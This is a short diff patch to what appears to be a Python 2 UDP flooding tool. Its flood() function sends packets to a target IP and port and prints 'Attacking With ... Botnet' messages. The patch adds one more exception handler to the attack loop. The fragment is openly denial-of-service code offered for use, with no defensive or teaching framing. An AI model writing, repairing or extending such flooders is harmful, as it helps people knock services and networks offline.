@@ -35,6 +35,8 @@ def flood():
             print "Attacking With %s Botnet | Target %s port %s"%(sent,ip,port)
         except TypeError:
             print "Attacking With %s Botnet | Target %s port %s"%(sent,ip,port)
+        except error:
+            print "Attacking With %s Botnet | Target %s port %s"%(sent,ip,port)
         except:
             s.sendto(bytes1, (ip,port))
             s.sendto(bytes2, (ip,port))
